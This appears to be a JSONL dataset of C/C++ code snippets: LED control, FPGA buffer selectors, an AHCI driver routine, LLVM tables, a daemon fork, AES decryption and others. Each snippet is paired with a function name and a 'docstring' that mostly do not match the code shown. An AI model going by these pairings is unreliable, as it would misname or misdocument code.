{"content":"{'function_name': 'doDefault', 'docstring': '\/\/1:static form capability report.\\r', 'code': 'void main()\\r\\n{\\r\\n\\tHRESULT hr;\\r\\n\\tIUnknown *pUnknown;\\r\\n\\tIAacLedDeviceHal* hal;\\r\\n\\r\\n\\tOLECHAR* guidString;\\r\\n\\tStringFromCLSID(CLSID_MYLEDDEVICE, &guidString);\\r\\n\\tstd::wstring key = guidString;\\r\\n\\r\\n\\tCheckDeviceIdRegistered(key.c_str());\\r\\n\\r\\n\\tCoInitialize(NULL);\\r\\n\\r\\n\\thr = CoCreateInstance(CLSID_MYLEDDEVICE, NULL, CLSCTX_INPROC_SERVER,\\r\\n\\t\\tIID_IAacLedDeviceHal, (void **)&hal); \\r\\n\\tif (!SUCCEEDED(hr))\\r\\n\\t\\treturn;\\r\\n\\r\\n\\thal->AddRef();\\r\\n\\tULONG count = 0;\\r\\n\\r\\n\\thal->Enumerate(NULL, &count);\\r\\n\\tif (count <= 0)\\r\\n\\t\\treturn;\\r\\n\\r\\n\\tIAacLedDevice** devices = new IAacLedDevice*[count];\\r\\n\\thal->Enumerate(devices, &count);\\r\\n\\r\\n\\tstd::vector<LedCapability> caps;\\r\\n\\r\\n\\t\/\/ Enumerate each device and read its capablility.\\r\\n\\tfor (size_t i = 0; i < count; ++i)\\r\\n\\t{\\r\\n\\t\\tBSTR capData = NULL;\\r\\n\\t\\tdevices[i]->GetCapability(&capData);\\r\\n\\r\\n\\t\\tLedCapability cap;\\r\\n\\t\\tParseCapability(capData, cap);\\r\\n\\t\\tcaps.push_back(cap);\\r\\n\\r\\n\\t\\t::SysFreeString(capData);\\r\\n\\t}\\r\\n\\r\\n\\t\\r\\n\\tstd::vector<IAacLedDevice**>devices_vector;\\r\\n\\tfor (int c = 0; c < count; c++){\\r\\n\\t\\tdevices_vector.push_back(devices);\\r\\n\\t\\tdevices++;\\r\\n\\t}\\r\\n\\r\\n\\ttypedef void (*func)(LedCapability cap, IAacLedDevice** device, LedEffect effect);\\r\\n\\tstd::map<DWORD, func> getFunction = {\\r\\n\\t\\t{ 0, &doSoftware },\\r\\n\\t\\t{ 1, &doStatic },\\r\\n\\t\\t{ 2, &doBreathing },\\r\\n\\t\\t{ 3, &doStrobing },\\r\\n\\t\\t{ 4, &doColorcycle },\\r\\n\\t\\t{ 5, &doRainbow },\\r\\n\\t\\t{ 0xFF, &doDefault }\\r\\n\\t};\\r\\n\\r\\n\\r\\n\\r\\n\\tfor (int i = 0; i < devices_vector.size(); ++i)\\r\\n\\t\\tfor each(LedEffect effect  in caps[i].effects)\\r\\n\\t\\t{\\r\\n\\t\\t\\t(*getFunction[effect.id])(caps[i], devices_vector[i], effect);\\r\\n\\t\\t}\\r\\n}'}","id":4780}
{"content":"{'function_name': 'denoise_demosaicb_update_0_read_bundle_read', 'docstring': '\/\/ demosaicb_rd17', 'code': 'inline hw_uint<16> denoise_rd0_select(denoiseb_cache& denoiseb, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoise_rd0 read pattern: { denoise_update_0[d0, d1] -> denoiseb[2d0, d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoise_update_0[d0, d1] -> [2 + d1, 1 + d0, 3] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ DD fold: {  }\\n  auto value_denoiseb_denoiseb_update_0_write0 = denoiseb.denoiseb_denoiseb_update_0_write0_merged_banks_1.peek(\/* one reader or all rams *\/ 0);\\n  return value_denoiseb_denoiseb_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4782}
{"content":"{'function_name': 'ahci_reset', 'docstring': '\/* Enable wanted port interrupts *\/', 'code': 'static int ahci_setup_fis(struct ahci_channel *ch, struct ahci_cmd_tab *ctp,\\n                          PacketAtaio *ataio, int tag) {\\n  u_int8_t *fis = &ctp->cfis[0];\\n\\n  bzero(fis, 20);\\n  fis[0] = 0x27; \/* host to device *\/\\n  fis[1] = (ataio->target_id & 0x0f);\\n  if (ataio->func_code == XPT_SCSI_IO) {\\n    kassert(false);\\n    \/\/ fis[1] |= 0x80;\\n    \/\/ fis[2] = ATA_PACKET_CMD;\\n    \/\/ if ((ccb->ccb_h.flags & CAM_DIR_MASK) != CAM_DIR_NONE &&\\n    \/\/     ch->curr[ccb->ccb_h.target_id].mode >= ATA_DMA)\\n    \/\/ \\tfis[3] = ATA_F_DMA;\\n    \/\/ else {\\n    \/\/ \\tfis[5] = ccb->csio.dxfer_len;\\n    \/\/         fis[6] = ccb->csio.dxfer_len >> 8;\\n    \/\/ }\\n    \/\/ fis[7] = ATA_D_LBA;\\n    \/\/ fis[15] = ATA_A_4BIT;\\n    \/\/ bcopy((ccb->ccb_h.flags & CAM_CDB_POINTER) ?\\n    \/\/     ccb->csio.cdb_io.cdb_ptr : ccb->csio.cdb_io.cdb_bytes,\\n    \/\/     ctp->acmd, ccb->csio.cdb_len);\\n    \/\/ bzero(ctp->acmd + ccb->csio.cdb_len, 32 - ccb->csio.cdb_len);\\n  } else if ((ataio->cmd.flags & CAM_ATAIO_CONTROL) == 0) {\\n    fis[1] |= 0x80;\\n    fis[2] = ataio->cmd.command;\\n    fis[3] = ataio->cmd.features;\\n    fis[4] = ataio->cmd.lba_low;\\n    fis[5] = ataio->cmd.lba_mid;\\n    fis[6] = ataio->cmd.lba_high;\\n    fis[7] = ataio->cmd.device;\\n    fis[8] = ataio->cmd.lba_low_exp;\\n    fis[9] = ataio->cmd.lba_mid_exp;\\n    fis[10] = ataio->cmd.lba_high_exp;\\n    fis[11] = ataio->cmd.features_exp;\\n    if (ataio->cmd.flags & CAM_ATAIO_FPDMA) {\\n      fis[12] = tag << 3;\\n      fis[13] = 0;\\n    } else {\\n      fis[12] = ataio->cmd.sector_count;\\n      fis[13] = ataio->cmd.sector_count_exp;\\n    }\\n    fis[15] = ATA_A_4BIT;\\n  } else {\\n    fis[15] = ataio->cmd.control;\\n  }\\n  if (ataio->ata_flags & ATA_FLAG_AUX) {\\n    fis[16] = ataio->aux & 0xff;\\n    fis[17] = (ataio->aux >> 8) & 0xff;\\n    fis[18] = (ataio->aux >> 16) & 0xff;\\n    fis[19] = (ataio->aux >> 24) & 0xff;\\n  }\\n  return (20);\\n}'}","id":4783}
{"content":"{'function_name': 'getMemOpcode', 'docstring': \"\/\/ Instruction doesn't exist in this table.\", 'code': \"LLVM_READONLY\\nint getThreeOperandOpcode(uint16_t Opcode) {\\nstatic const uint16_t getThreeOperandOpcodeTable[][2] = {\\n  { SystemZ::AGHI, SystemZ::AGHIK },\\n  { SystemZ::AGR, SystemZ::AGRK },\\n  { SystemZ::AHI, SystemZ::AHIK },\\n  { SystemZ::AHIMux, SystemZ::AHIMuxK },\\n  { SystemZ::ALGR, SystemZ::ALGRK },\\n  { SystemZ::ALR, SystemZ::ALRK },\\n  { SystemZ::AR, SystemZ::ARK },\\n  { SystemZ::NGR, SystemZ::NGRK },\\n  { SystemZ::NR, SystemZ::NRK },\\n  { SystemZ::OGR, SystemZ::OGRK },\\n  { SystemZ::OR, SystemZ::ORK },\\n  { SystemZ::SGR, SystemZ::SGRK },\\n  { SystemZ::SLGR, SystemZ::SLGRK },\\n  { SystemZ::SLL, SystemZ::SLLK },\\n  { SystemZ::SLR, SystemZ::SLRK },\\n  { SystemZ::SR, SystemZ::SRK },\\n  { SystemZ::SRA, SystemZ::SRAK },\\n  { SystemZ::SRL, SystemZ::SRLK },\\n  { SystemZ::XGR, SystemZ::XGRK },\\n  { SystemZ::XR, SystemZ::XRK },\\n}; \/\/ End of getThreeOperandOpcodeTable\\n\\n  unsigned mid;\\n  unsigned start = 0;\\n  unsigned end = 20;\\n  while (start < end) {\\n    mid = start + (end - start)\/2;\\n    if (Opcode == getThreeOperandOpcodeTable[mid][0]) {\\n      break;\\n    }\\n    if (Opcode < getThreeOperandOpcodeTable[mid][0])\\n      end = mid;\\n    else\\n      start = mid + 1;\\n  }\\n  if (start == end)\\n    return -1; \/\/ Instruction doesn't exist in this table.\\n\\n  return getThreeOperandOpcodeTable[mid][1];\\n}\"}","id":4786}
{"content":"{'function_name': 'capture_pcd', 'docstring': '\/\/******************************', 'code': 'int main(int argc, char **argv)\\n{\\n  \/\/ INITIALIZE ROS\\n  ros::init(argc, argv, \"kinect_capture\");\\n  ros::NodeHandle n;\\n\\n  service = n.advertiseService(\"capture_cloud\", capture_pcd);\\n\\n  ros::spin();\\n\\n  return 0;\\n}'}","id":4788}
{"content":"{'function_name': 'drawScene', 'docstring': '\/\/ draw the cube', 'code': 'void \\ndisplay()\\n{\\t\\t\\n\\t\\n\\t\/\/ clear the buffers\\n\\tglClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);\\n\\t\\n\\t\/\/ prepare the modelview with an offset backward\\n\\tglMatrixMode(GL_MODELVIEW);\\n\\tglLoadIdentity();\\n\\tglTranslatef(0.0f, 0.0f, -1.6f);\\n\\t\\n\\t\/\/ draw the scene\\n\\tdrawScene();\\n\\t\\n\\t\/\/ and then swap the framebuffer into view\\n\\tglutSwapBuffers();\\n\\n  return;\\n}'}","id":4789}
{"content":"{'function_name': 'setup', 'docstring': '\/\/ start the ws2811 library', 'code': \"void texttest(char msg[], int leng){   \\n\/\/==Start of message setup==\/\/\\n  for (int charIndex=0; charIndex < (leng-1); charIndex++) \/\/start of charIndex setup\\n  { \\n    int  alphabetIndex = msg[charIndex]- ' ';\\n    if (alphabetIndex < 0) alphabetIndex=0;\\n    bool isOn =0;\\n    for (int col=0; col < 6;col++) {\\n      \/\/==START OF SET METHOD==\/\/\\n      for(int row=0; row<rows ;row++){\\n        if (col<5) isOn = bitRead( alphabets[alphabetIndex][col], row ) == 1;\\n        leds.setPixel(pix[row], isOn*Colour1);\\n        leds.show();delay(8);\\n      }\\n      \/\/==START OF THE SCROLL METHOD==\/\/\\n      for(int a=0; a<rows; a++){\\n        for(int b=1; b<ledsPerStrip;b++){\\n          int a1 = a*ledsPerStrip;\\n          leds.setPixel(((a1+b)-1),leds.getPixel(a1+b));\\n          if (Serial.available()) {\\n            \/\/ if new serial clear the leds and return\\n            for (int c = 0; c<(rows*ledsPerStrip); c++) {\\n              leds.setPixel(c,0);\\n            }\\n            \/\/memset(printBuffer, 0, sizeof(printBuffer));\\n            lock = 0;\\n            return;\\n          }\\n         }\\n\\n      }\/\/end of Scroll Method\\n    }\/\/end of Set Method\\n  }\/\/end of message setup\\n}\"}","id":4790}
{"content":"{'function_name': 'Parse', 'docstring': '\/\/  return the error indicator', 'code': 'gboolean            Lex()\\n{\\n    \/*\\n    libgwr::Chrono  chrono;\\n    int             yyret   =   0;\\n    \/\/  ........................................................................\\n    g_return_val_if_fail( ! A_kconfig_stream,   FALSE );                        \/\/  ensure no stream is defined\\n    \/\/  ........................................................................\\n    \/\/  kconfig stream\\n\\n    \/\/ eventually create - erase current content\\n\\tA_kconfig_stream = fopen(globals::g_kernel_kconfig_abspath, \"r\");\\n\\n\\t\/\/ make sure it is valid:\\n\\tif ( ! A_kconfig_stream )\\n    {\\n        PARSING_FILES_ERR(\"Could not open file [%s]\", globals::g_kernel_kconfig_abspath);\\n\\t\\treturn FALSE;\\n\\t}\\n\\n    Kconfig_array_add(globals::g_kernel_kconfig_relpath);                       \/\/  add 1st Kconfig file to the Kconfig files array, now size is 1, and index 0\\n    a_stack_kconfig_file_index.push(0);                                         \/\/  push that index on the stack\\n\\n    \/\/  ........................................................................\\n\\t\/\/ set flex to read from it instead of defaulting to STDIN:\\n\\tyyin = A_kconfig_stream;\\n\\n    PARSING_STD_INF(\"%s\", \"Parsing started...\");\\n\\n    \/\/ go !\\n\\n    \/\/  init libkconfig::object logging :\\n    \/\/      - log along Bison log\\n    \/\/      - warning on str -> int conversion, but it should not happend,\\n    \/\/        parsing just build the structures and doesnt affect values\\n    libkconfig::object::G_log_wrap(LIBKCONFIG_LOG_CHANNEL_PARSING_BISON, libkconfig::parser::P_container_spacer());\\n    chrono.start();\\n    yyret = yyparse();\\n    chrono.time();\\n    libkconfig::object::G_log_unwrap();\\n\\n    fclose(A_kconfig_stream);\\n\\n    fflush(stdin);\\n\\n    PARSING_STD_INF(\"Parsing finished in  %i:%i\", chrono.es(), chrono.ems());\\n    PARSING_STD_INF(\"  Lexer status :%s\", lexer::Status());\\n    PARSING_STD_INF(\"  Parser status:%s\", parser::Status());\\n\\n    PARSER_BISON_STD_INF(\"Symbols   :%i\", libkconfig::object::factory::g_card_symbol()   );\\n    PARSER_BISON_STD_INF(\"Containers:%i\", libkconfig::object::factory::g_card_container());\\n    PARSER_BISON_STD_INF(\"Items     :%i\", libkconfig::object::factory::g_card_item()     );\\n    PARSER_BISON_STD_INF(\"Hash      :%i\", libkconfig::object::factory::g_ht_size()       );\\n\\n    \/\/  return the error indicator\\n    return ( yyret != 0 );\\n    *\/\\n    return FALSE;\\n}'}","id":4791}
{"content":"{'function_name': 'Str_ScanFile', 'docstring': '\/\/\u8fd4\u56demap', 'code': 'int Str_GetSystemFile(lua_State* ls)\\n{\\n\\tvector<FileInfoStruct*> vecOut;\\n\\tCKpFindFile::GetSystemFile(vecOut);\\n\\t\/\/\u8fd4\u56demap\\n\\tlua_newtable(ls);\\n\\tfor (int i=0;i<vecOut.size();i++){\\n\\t\\tlua_pushfstring(ls,\"%s\",vecOut[i]->sFileName.c_str());\/\/map  value \u503c\\n\\t\\tlua_setfield(ls,-2,vecOut[i]->sFullPath.c_str());\/\/map Key \u952e\\n\\t}\\n\\treturn 1;\\n}'}","id":4793}
{"content":"{'function_name': 'turn_to_absolute_degree', 'docstring': '\/\/ \u8f6c\u5230\u504f\u7f6e\u5750\u6807\u7cfb\u4e2d\u7279\u5b9a\u89d2\u5ea6--\u8bbe\u5b9a\u7b2c\u4e8c\u9636\u6bb5\u521d\u59cb\u89d2\u5ea6\u503c\u4e3a180\uff0c\u987a+->359.9\uff0c\u9006-->0;', 'code': 'bool find_if_beacon_on(){\\n  int f_l[11],f_r[11];\\n  int f_max,f_l_max,f_r_max;\\n  f_l_max = 0;f_r_max = 0;\\n  f_l[10] = 0;\\n  f_r[10] = 0;\\n  f_l[0]=analogRead(flame_a_1);\\n  f_l[1]=analogRead(flame_a_2);\\n  f_l[2]=analogRead(flame_a_3);\\n  f_l[3]=analogRead(flame_a_4);\\n  f_l[4]=analogRead(flame_a_5);\\n  f_r[0]=analogRead(flame_b_1);\\n  f_r[1]=analogRead(flame_b_2);\\n  f_r[2]=analogRead(flame_b_3);\\n  f_r[3]=analogRead(flame_b_4);\\n  f_r[4]=analogRead(flame_b_5);\\n\\n\\n  turn_to_absolute_degree(90);\\n\\n  f_l[5]=analogRead(flame_a_1);\\n  f_l[6]=analogRead(flame_a_2);\\n  f_l[7]=analogRead(flame_a_3);\\n  f_l[8]=analogRead(flame_a_4);\\n  f_l[9]=analogRead(flame_a_5);\\n  f_r[5]=analogRead(flame_b_1);\\n  f_r[6]=analogRead(flame_b_2);\\n  f_r[7]=analogRead(flame_b_3);\\n  f_r[8]=analogRead(flame_b_4);\\n  f_r[9]=analogRead(flame_b_5);\\n\\nfor(int i = 0;i<10;i++){\\n  f_r_max =max(f_r[i],f_r_max);\\n  f_l_max =max(f_l[i],f_l_max);\\n}\\nf_max = max(f_r_max,f_l_max);\\n\/\/ _seriaL.println(f_max);\\nturn_to_absolute_degree(180);\\n_seriaL.println(\"Find if beacon On\");\\n_seriaL.println(f_max);\\nif(f_max>150){return true;}\\nelse {return false;}\\n}'}","id":4802}
{"content":"{'function_name': 'denoiseb_rd14_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd15_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd15 read pattern: { denoiseb_update_0[d0, d1] -> raw[1 + 2d0, -2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 3861 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_3861();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4806}
{"content":"{'function_name': 'main_loop', 'docstring': '\/\/ IPP', 'code': 'int main (int argc, char **argv){\\n    \\n    pid_t process_id = 0;\\n    pid_t sid = 0;\\n\\n    process_id = fork();\\n    if (process_id > 0) {\\n\/\/        printf(\"process_id of child process %d \\\\n\", process_id);\\n        \/\/ return success in exit status\\n        exit(0);\\n    }\\n\\n    umask(0);\\n\\n    \/\/set new session\\n    sid = setsid();\\n    \\n    if(sid < 0) {\\n        \/\/ Return failure\\n        \/\/ exit(1);\\n    }\\n    \\n    signal(SIGHUP, handle_signal);\\n\/\/    signal(SIGTERM, handle_signal);\\n    \\n    \/\/ Change the current working directory to root.\\n    chdir(\"\/\");\\n    \/\/ Close stdin. stdout and stderr\\n    \\n    close(STDIN_FILENO);\\n    close(STDOUT_FILENO);\\n    close(STDERR_FILENO);\\n    \\n    return main_loop(argc, argv);\\n}'}","id":4811}
{"content":"{'function_name': 'fma_mixed', 'docstring': '\/\/ sparse * dense and sparse * sparse together', 'code': 'void fma_mixed(\\n            vectors::hybrid_vector<Basis, Coeffs>& out,\\n            const vectors::hybrid_vector<Basis, Coeffs>& lhs,\\n            const vectors::hybrid_vector<Basis, Coeffs>& rhs,\\n            Fn op,\\n            DEG max_degree) const\\n    {\\n        using sparse_vec = vectors::sparse_vector<Basis, Coeffs>;\\n        const auto& basis = out.basis;\\n        const auto& self = static_cast<const Multiplication&>(*this);\\n\\n        if (lhs.sparse_empty() && rhs.sparse_empty()) {\\n            return;\\n        }\\n\\n        graded_multiplication_helper<sparse_vec> helper(rhs, max_degree);\\n        auto out_deg = std::min(helper.depth(), lhs.degree() + rhs.degree());\\n\\n        \/\/ dense*sparse\\n        if (lhs.dense_dimension() > 0) {\\n            auto ld_degree = lhs.dense_degree();\\n            auto rbegin = helper.begin();\\n\\n            for (DEG ldeg = 0; ldeg <= ld_degree; ++ldeg) {\\n                auto rend = helper.degree_range(out_deg - ldeg).end();\\n                for (auto idx = basis.start_of_degree(ldeg); idx < basis.start_of_degree(ldeg + 1); ++idx) {\\n                    for (auto rit = rbegin; rit != rend; ++rit) {\\n                        self.asp_helper(out, self.eval(basis.index_to_key(idx), rit->first),\\n                                        op(lhs.dense_value(idx) * rit->second));\\n                    }\\n                }\\n            }\\n        }\\n\\n        \/\/ sparse*dense and sparse*sparse\\n        auto lbegin = lhs.sparse_part().begin();\\n        auto lend = lhs.sparse_part().end();\\n        auto rddeg = rhs.dense_degree();\\n        auto rhs_has_dense = rhs.dense_dimension() > 0;\\n\\n        for (auto lit = lbegin; lit != lend; ++lit) {\\n            auto lkey = lit->key();\\n            auto lhs_deg = basis.degree(lkey);\\n            assert(out_deg >= lhs_deg);\\n            auto rhs_deg = out_deg - lhs_deg;\\n            auto rhs_ddeg = std::min(rhs_deg, rddeg);\\n\\n            if (rhs_has_dense) {\\n                for (DIMN idx = 0; idx < basis.start_of_degree(rhs_ddeg + 1); ++idx) {\\n                    self.asp_helper(out, self.eval(lkey, basis.index_to_key(idx)), op(lit->value() * rhs.dense_value(idx)));\\n                }\\n            }\\n\\n            for (const auto& ritem : helper.degree_range(out_deg - lhs_deg)) {\\n                self.asp_helper(out, self.eval(lkey, ritem.first), op(lit->value() * ritem.second));\\n            }\\n        }\\n\\n        out.maybe_resize();\\n    }'}","id":4817}
{"content":"{'function_name': 'diagonalContourLevels', 'docstring': '\/\/ traverse the counter-diagonal', 'code': 'vector<double> horizontalCenterLinePoints()\\n{\\n  \/\/ points where values are often reported in the literature\\n  vector<double> xPoints;\\n  xPoints.push_back(0.0000);\\n  xPoints.push_back(0.0312);\\n  xPoints.push_back(0.0391);\\n  xPoints.push_back(0.0469);\\n  xPoints.push_back(0.0547);\\n  xPoints.push_back(0.0937);\\n  xPoints.push_back(0.1406);\\n  xPoints.push_back(0.1953);\\n  xPoints.push_back(0.5000);\\n  xPoints.push_back(0.7656);\\n  xPoints.push_back(0.7734);\\n  xPoints.push_back(0.8437);\\n  xPoints.push_back(0.9062);\\n  xPoints.push_back(0.9219);\\n  xPoints.push_back(0.9297);\\n  xPoints.push_back(0.9375);\\n  xPoints.push_back(1.0000);\\n  return xPoints;\\n}'}","id":4820}
{"content":"{'function_name': 'main', 'docstring': '\/\/\\tcout<<num<<endl;\\r', 'code': 'int Bsearch(int arr[], int index, int min, int max){\/\/\u4e8c\u5143\u641c\u5c0b\u6cd5\\r\\n\\tint mid;\\r\\n\\twhile( min <= max ) {\\r\\n\\t\\tmid = (min+max) \/ 2;\\r\\n\/\/\\t\\tcout<<\"Hello\\\\n\";\\r\\n\\t\\tif( arr[mid] == index)\\r\\n\\t\\t\\treturn mid;\\r\\n\\t\\telse if( arr[mid] < index )\\r\\n\\t\\t\\tmin=mid+1;\\r\\n\\t\\telse if( arr[mid] > index )\\r\\n\\t\\t\\tmax=mid-1;\\r\\n\/\/\\t\\tcout<<min<<\" \"<<mid<<\" \"<<max<<endl;\\r\\n\\t}\\r\\n\\t\\r\\n\\treturn -1;\\t\\r\\n}'}","id":4821}
{"content":"{'function_name': 'generate_insert_aircraft_metadata_SQL_command', 'docstring': '\/\/      cout << SQL_command << endl;', 'code': 'bool insert_camera_metadata(\\n      gis_database* gis_database_ptr,\\n      int campaign_ID,int mission_ID,int frame_ID,\\n      double horiz_FOV,double vert_FOV,\\n      double camera_az,double camera_el,double camera_roll)\\n   {\\n\/\/      cout << \"inside databasefunc::insert_aircraft_metadata()\" << endl;\\n\\n      string curr_insert_command=\\n         databasefunc::generate_insert_camera_metadata_SQL_command(\\n            campaign_ID,mission_ID,frame_ID,\\n            horiz_FOV,vert_FOV,camera_az,camera_el,camera_roll);\\n      \\n      vector<string> insert_commands;\\n      insert_commands.push_back(curr_insert_command);\\n      gis_database_ptr->set_SQL_commands(insert_commands);\\n\\n      return gis_database_ptr->execute_SQL_commands();\\n   }'}","id":4823}
{"content":"{'function_name': 'loadVocabularies', 'docstring': '\/\/ with the current setup, we need at least two vocabs: src and trg', 'code': 'ug::ssplit::SentenceStream::splitmode\\nstring2splitmode(const std::string& m, bool throwOnError\/*=false*\/){\\n  typedef ug::ssplit::SentenceStream::splitmode splitmode;\\n  \/\/ @TODO: throw Exception on error\\n  if (m == \"sentence\" || m == \"Sentence\")\\n    return splitmode::one_sentence_per_line;\\n  if (m == \"paragraph\" || m == \"Paragraph\")\\n    return splitmode::one_paragraph_per_line;\\n  if (m != \"wrapped_text\" && m != \"WrappedText\" && m != \"wrappedText\") {\\n    LOG(warn,\"Ignoring unknown text input format specification: {}.\", m);\\n  }\\n  return splitmode::wrapped_text;\\n}'}","id":4830}
{"content":"{'function_name': 'find_zero_crossing_on_face', 'docstring': '\/\/auto ip = (pts[1] - pts[0]) * t + pts[0];', 'code': 'point<T, 2>\\nfind_zero_crossing_on_face3(const point<T,2>& p0, const point<T,2>& p1, const Function& level_set_function,\\n                   const T& threshold, const Mesh & msh, const typename Mesh::face_type& fc)\\n{\\n    \/* !!! We assume that the level set function *has* a zero crossing\\n     * between p0 and p1 !!! *\/\\n    \\n    \/\/ I SHOULD CHECK THAT pm IS ALWAYS ON THE FACE p0-p1 ???????\\n    auto pa = p0;\\n    auto pb = p1;\\n    auto pm = (pa+pb)\/2.0;\\n    auto pm_prev = pm;\\n    T iso_val_interface = level_set_function.iso_val_interface ;\\n    T x_diff_sq, y_diff_sq;\\n\\n    \/* A threshold of 1\/10000 the diameter of the element is considered\\n     * acceptable. Since with 24 iterations we reduce the error by 16384\\n     * and the worst case is that the two points are at the opposite sides\\n     * of the element, we put 30 as limit. *\/\\n    size_t max_iter = 50;\\n\\n    do {\\n        \/\/auto la = level_set_function(pa,msh,fc);\\n        auto lb = level_set_function(pb,msh,fc);\\n        auto lm = level_set_function(pm,msh,fc);\\n\\n        if ( (lb >= iso_val_interface && lm >= iso_val_interface) || (lb < iso_val_interface && lm < iso_val_interface) )\\n        {   \/* intersection is between pa and pm *\/\\n            pm_prev = pm;\\n            pb = pm;\\n            pm = (pa+pb)\/2.0;\\n        }\\n        else\\n        {   \/* intersection is between pm and pb *\/\\n            pm_prev = pm;\\n            pa = pm;\\n            pm = (pa+pb)\/2.0;\\n        }\\n\\n        x_diff_sq = (pm_prev.x() - pm.x()) * (pm_prev.x() - pm.x());\\n        y_diff_sq = (pm_prev.y() - pm.y()) * (pm_prev.y() - pm.y());\\n\\n    } while ( (sqrt(x_diff_sq + y_diff_sq) > threshold) && max_iter-- );\\n\\n    return pm;\\n\\n    \/* Affine zero crossing was like that: *\/\\n    \/\/auto t = l0\/(l0-l1);\\n    \/\/auto ip = (pts[1] - pts[0]) * t + pts[0];\\n}'}","id":4831}
{"content":"{'function_name': 'astar_helper', 'docstring': '\/\/ End timer', 'code': 'vector<Node *> generateChildren(Node *node){\\n    \/\/ Create new board for each position queen in column can go to\\n    vector<Node *> children;\\n\\n    for(int i = 0; i < node->board->board_size; ++i){\\n        \/\/ find queen row\\n        int qRow;\\n        for(int j = 0; j < node->board->board_size; ++j){\\n            if(node->board->state[j][i]){\\n                qRow = j;\\n                break;\\n            }\\n        }\/\/ Itr through rows\\n\\n        \/\/ Create new states for each non queen space in column by swapping\\n        for(int j = 0; j < node->board->board_size; ++j){\\n            if(j != qRow){\\n                Board *newBoard = new Board;\\n                newBoard->board_size = node->board->board_size;\\n                newBoard->state = node->board->state;\\n                newBoard->state[j][i] = 1;\\n                newBoard->state[qRow][i] = 0;\\n                newBoard->h_score = heuristic(newBoard);\\n                Node *newNode = new Node;\\n                newNode->parent = node;\\n                newNode->board = newBoard;\\n                newNode->path_cost = node->path_cost + 1;\\n                newNode->f_score = newNode->path_cost + newNode->board->h_score;\\n\\n                children.push_back(newNode);\\n            }\\n        }\\n    } \/\/ Itr through columns\\n\\n    return children;\\n}'}","id":4844}
{"content":"{'function_name': 'calc_GiniIndex', 'docstring': '\/\/ size_t size = matrix.size();', 'code': 'double calc_Chisquare(vector<vector<double>>& matrix) {\\n    vector<double> attrSum;\\n    vector<double> clsSum;\\n    double allSum;\\n    getSumRowCol(matrix, attrSum, clsSum, allSum);\\n    \/\/ size_t size = matrix.size();\\n    double ret = 0;\\n    for (size_t i = 0; i < matrix.size(); i++) {\\n        for (size_t j = 0; j < matrix[i].size(); j++) {\\n            double expect = attrSum[j] * clsSum[i] \/ allSum;\\n            ret += (matrix[i][j] - expect) * (matrix[i][j] - expect) \/\\n                   max(expect, 0.5);\\n        }\\n    }\\n    return ret;\\n}'}","id":4845}
{"content":"{'function_name': 'MimeOleSetBodyPropA', 'docstring': '\/\/ Call Method\\r', 'code': 'MIMEOLEAPI MimeOleGetBodyPropW(\\r\\n                               IMimeMessageTree   *pTree,\\r\\n                               HBODY               hBody,\\r\\n                               LPCSTR              pszName,\\r\\n                               DWORD               dwFlags,\\r\\n                               LPWSTR             *ppszData)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n\\r\\n    \/\/ Invaid Arg\\r\\n    if (NULL == pTree)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Initialzie PropVariant\\r\\n    PROPVARIANT rVariant;\\r\\n    rVariant.vt = VT_LPWSTR;\\r\\n\\r\\n    \/\/ Call Method\\r\\n    CHECKHR(hr = pTree->GetBodyProp(hBody, pszName, dwFlags, &rVariant));\\r\\n\\r\\n    \/\/ Return the Data\\r\\n    *ppszData = rVariant.pwszVal;\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":4851}
{"content":"{'function_name': 'getHardwareInfo', 'docstring': '\/\/printf(\"hardwareinfo===>%s \\\\n\",hardwareInfo);', 'code': 'int decryptPbData(unsigned char *cipherData, int cipherDataLen, unsigned char pbKey[], unsigned char *pbContent) {\\n\\n\\t\/\/\u89e3\u5bc6\\n\\tAES_KEY aes_key;\\n\\tif (AES_set_decrypt_key(pbKey, 128, &aes_key)<0)\\n\\t{\\n\\t\\tprintf(\"\u8bbe\u7f6e\u89e3\u5bc6\u5bc6\u94a5\u5931\u8d25!!\\\\n\");\\n\\t\\treturn 0;\\n\\t}\\n\\n\\tfor (int ind = 0; ind < cipherDataLen \/ 16; ind++)\\n\\t{\\n\\t\\tAES_ecb_encrypt(cipherData + ind * 16, pbContent + ind * 16, &aes_key, AES_DECRYPT);\\n\\t}\\n\\n\\treturn 1;\\n}'}","id":4859}
